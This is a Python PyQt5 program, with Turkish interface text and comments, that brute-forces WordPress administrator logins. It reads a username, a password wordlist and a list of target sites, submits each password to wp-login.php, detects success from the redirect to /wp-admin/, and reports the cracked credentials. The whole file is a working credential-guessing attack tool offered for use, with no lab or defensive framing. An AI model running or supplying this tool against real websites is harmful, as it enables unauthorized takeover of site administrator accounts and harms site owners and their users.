import sys
import requests
from time import sleep, time
from PyQt5.QtWidgets import (
    QApplication, QWidget, QPushButton, QTextEdit, QVBoxLayout,
    QFileDialog, QLineEdit, QLabel, QMessageBox
)
from PyQt5.QtGui import QFont
from PyQt5.QtCore import Qt, QThread, pyqtSignal


# 👉 Arka planda çalışan iş parçacığı sınıfı
class BruteForceThread(QThread):
    log_signal = pyqtSignal(str, str)
    stats_signal = pyqtSignal(int, int, float)

    def __init__(self, username, wordlist, targets):
        super().__init__()
        self.username = username
        self.wordlist = wordlist
        self.targets = targets
        self.total_attempts = 0
        self.success_count = 0

    def try_login(self, url, username, password):
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': url + '/wp-admin/',
            'testcookie': '1'
        }
        session = requests.Session()
        try:
            session.get(url + '/wp-login.php', timeout=5)
            response = session.post(url + '/wp-login.php', data=data, allow_redirects=False, timeout=5)
            return 'Location' in response.headers and '/wp-admin/' in response.headers['Location']
        except:
            return False

    def run(self):
        start_time = time()
        for site in self.targets:
            self.log_signal.emit(f"\n🎯 Hedef: {site}", "🎯")
            success = False
            for password in self.wordlist:
                self.total_attempts += 1
                self.log_signal.emit(f"🧪 Deneniyor: {self.username}:{password}", "🧪")
                if self.try_login(site, self.username, password):
                    self.success_count += 1
                    self.log_signal.emit(f"✅ BAŞARILI → {self.username}:{password}", "🔓")
                    success = True
                    break
                else:
                    self.log_signal.emit("❌ Hatalı parola.", "❌")
                sleep(0.3)
            if not success:
                self.log_signal.emit("🔒 Giriş başarısız.", "🔒")
        duration = time() - start_time
        self.stats_signal.emit(self.total_attempts, self.success_count, duration)


# 👉 Ana arayüz sınıfı
class WPBruteGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🔐 WP Brute Force - Thread Destekli")
        self.setGeometry(200, 200, 800, 600)

        self.layout = QVBoxLayout()

        # Kullanıcı adı
        self.user_input = QLineEdit()
        self.user_input.setPlaceholderText("👤 Kullanıcı adı (örn: admin)")
        self.layout.addWidget(QLabel("👤 Kullanıcı Adı:"))
        self.layout.addWidget(self.user_input)

        # Wordlist seçimi
        self.wordlist_path = ""
        self.wordlist_button = QPushButton("📂 Wordlist Seç (.txt)")
        self.wordlist_button.clicked.connect(self.select_wordlist)
        self.layout.addWidget(self.wordlist_button)

        # Target list seçimi
        self.targetlist_path = ""
        self.targetlist_button = QPushButton("🌐 Hedef Listesi Seç (.txt)")
        self.targetlist_button.clicked.connect(self.select_targetlist)
        self.layout.addWidget(self.targetlist_button)

        # Başlat butonu
        self.start_button = QPushButton("🚀 Teste Başla")
        self.start_button.clicked.connect(self.start_attack)
        self.layout.addWidget(self.start_button)

        # Log kutusu
        self.result_box = QTextEdit()
        self.result_box.setFont(QFont("Courier", 10))
        self.result_box.setReadOnly(True)
        self.layout.addWidget(QLabel("📋 Log:"))
        self.layout.addWidget(self.result_box)

        # İstatistik
        self.stats_label = QLabel("📊 İstatistik: Bekleniyor...")
        self.layout.addWidget(self.stats_label)

        self.setLayout(self.layout)

    def log(self, message, emoji="ℹ️"):
        self.result_box.append(f"{emoji} {message}")

    def update_stats(self, attempts, successes, duration):
        rate = (successes / attempts) * 100 if attempts > 0 else 0
        self.stats_label.setText(
            f"📊 Toplam Deneme: {attempts} | 🔓 Başarılı: {successes} | ⏱ Süre: {duration:.2f} sn | 🎯 Oran: {rate:.2f}%"
        )

    def select_wordlist(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Wordlist Seç", "", "Text Files (*.txt)")
        if file_path:
            self.wordlist_path = file_path
            self.log(f"Wordlist yüklendi: {file_path}", "📘")

    def select_targetlist(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Hedef Listesi Seç", "", "Text Files (*.txt)")
        if file_path:
            self.targetlist_path = file_path
            self.log(f"Hedef listesi yüklendi: {file_path}", "📄")

    def start_attack(self):
        self.result_box.clear()
        username = self.user_input.text().strip()

        if not username or not self.wordlist_path or not self.targetlist_path:
            QMessageBox.warning(self, "Eksik Bilgi", "Kullanıcı adı, hedef ve wordlist dosyaları seçilmeli.")
            return

        with open(self.wordlist_path, "r", encoding="utf-8") as f:
            wordlist = [line.strip() for line in f if line.strip()]

        with open(self.targetlist_path, "r", encoding="utf-8") as f:
            targets = [line.strip() for line in f if line.strip()]

        self.thread = BruteForceThread(username, wordlist, targets)
        self.thread.log_signal.connect(self.log)
        self.thread.stats_signal.connect(self.update_stats)
        self.thread.start()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = WPBruteGUI()
    window.show()
    sys.exit(app.exec_())
